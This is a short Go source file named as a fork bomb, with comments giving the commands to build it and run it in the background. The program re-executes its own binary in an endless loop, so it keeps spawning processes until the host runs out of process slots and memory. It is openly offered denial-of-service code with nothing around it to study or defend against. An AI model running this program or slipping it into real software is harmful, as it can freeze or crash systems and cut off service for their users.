// go build fork-bomb.go
// ./fork-bomb&

package main

import (
	"fmt"
	"os"
	"os/exec"
)

func main() {
	for {
    err := exec.Command(os.Args[0]).Run()
    if err != nil {
     fmt.Println(err)
    }
	}
}
